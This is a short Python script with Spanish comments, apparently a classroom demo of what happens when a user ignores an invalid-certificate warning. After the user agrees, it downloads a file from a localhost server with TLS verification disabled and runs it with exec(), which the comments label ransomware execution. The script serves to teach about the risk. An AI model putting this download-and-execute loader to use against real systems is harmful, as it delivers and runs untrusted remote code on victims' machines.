import requests
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

URL_OBJETIVO = "https://localhost:4443/payload.txt"

def simulacion_victima():
    print(f"Intentando conectar a {URL_OBJETIVO}...")

    # 1. INTENTO DE CONEXIÓN SEGURA (Simula el navegador verificando el certificado)
    try:
        # verify=True es el comportamiento por defecto de los navegadores
        response = requests.get(URL_OBJETIVO, verify=True)
        print("Conexión exitosa (Esto no debería pasar con un cert falso).")
    
    except requests.exceptions.SSLError as e:
        # 2. SE PROPORCIONA MENSAJE DE ADVERTENCIA
        print("\n[ALERTA DE SEGURIDAD] El certificado del sitio no es confiable.")
        print(f"Detalle del error: {e}")
        print("El navegador ha bloqueado la conexión para protegerte.")

    # 3. LA CONEXIÓN SE REALIZA IGNORANDO LA ADVERTENCIA
    decision = input("\n¿Deseas ignorar la advertencia y entrar de todos modos? (s/n): ")
    
    if decision.lower() == 's':
        print("\nUsuario decidió ignorar el riesgo. Conectando...")
        
        # Suprimimos las advertencias de consola de Python para limpiar la salida
        warnings.simplefilter('ignore', InsecureRequestWarning)
        
        # verify=False simula el botón "Continuar de todos modos"
        response = requests.get(URL_OBJETIVO, verify=False)
        
        if response.status_code == 200:
            print("Descarga completada.")
            
            # 4. EJECUCIÓN DEL RANSOMWARE
            print("Ejecutando el archivo descargado...\n")
            # 'utf-8-sig' le dice a Python: "Decodifica esto y si hay una firma BOM, bórrala"
            contenido_malicioso = response.content.decode('utf-8-sig')
            
            # exec() ejecuta el string descargado como código Python
            exec(contenido_malicioso) 
        else:
            print("Error al descargar el archivo.")
    else:
        print("El usuario cerró la conexión. Estás a salvo.")

if __name__ == "__main__":
    simulacion_victima()